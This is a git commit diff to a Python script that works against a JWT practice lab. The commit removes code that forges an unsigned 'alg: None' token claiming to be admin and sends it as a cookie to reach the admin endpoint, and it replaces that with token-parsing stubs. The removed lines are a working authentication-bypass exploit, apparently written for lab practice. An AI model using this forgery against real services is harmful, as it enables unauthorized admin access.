2e779d6074cb0ceab899ad07964a1197beae3c8c
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2021-11-12 20:39:29 -0500

    jwt

--- jwt-goats/retrieving_jwt.py
+++ jwt-goats/retrieving_jwt.py
@@ -3,7 +3,6 @@
 import requests
 import sys
 import jwt
-import base64
 
 from bs4 import BeautifulSoup
 
@@ -36,42 +35,19 @@ def login(url, endpoint, username, password):
         jwt_token = cookie['challenge']
         print(f"[INFO] JWT Token: {jwt_token}")
 
-        new_admin_jwt_token = jwt_handle()
-        print(f"[INFO] New JWT Token (None): {new_admin_jwt_token}")
-
-        admin_login(s, new_admin_jwt_token, url, endpoint)
     except:
         print("[ERROR] Something went wrong!")
         sys.exit(1)
 
     return jwt_token
 
-def jwt_handle():
+def jwt_handle(jwt_token):
 
-    # # Token Parse
-    # token_head = jwt_token.split(".")[0]
-    # token_payload = jwt_token.split(".")[1]
-    # token_secret = jwt_token.split(".")[2]
-
-    none_head = b'{"alg": "None"}'
-    admin_payload = b'{"name": "admin"}'
-
-    none_head_b64encode = base64.b64encode(none_head)
-    admin_payload_b64encode = base64.b64encode(admin_payload)
-    new_admin_jwt_token = none_head_b64encode.decode("utf-8") + "." + admin_payload_b64encode.decode("utf-8") + "."
-
-    return new_admin_jwt_token
-
-def admin_login(new_admin_jwt_token, url, endpoint):
-
-    cookies = {
-        "challenge": new_admin_jwt_token,
-    }
-
-    r = requests.get(url + endpoint, cookies=cookies)
-    print(r.text)
-
-
+    # Token Parse
+    token_head = jwt_token.split(".")[0]
+    token_payload = jwt_token.split(".")[1]
+    token_secret = jwt_token.split(".")[2]
+    
 
 if __name__ == '__main__':
     url = "https://jwt-lab.herokuapp.com"
@@ -80,8 +56,6 @@ if __name__ == '__main__':
     username = "bigb0ss"
     password = "password"
 
-    #login(url, endpoint, username, password)
-    new_admin_jwt_token = jwt_handle()
-    print(f"[INFO] New JWT Token (None): {new_admin_jwt_token}")
+    jwt_token = login(url, endpoint, username, password)
+    jwt_handle(jwt_token)
 
-    admin_login(new_admin_jwt_token, url, endpoint)
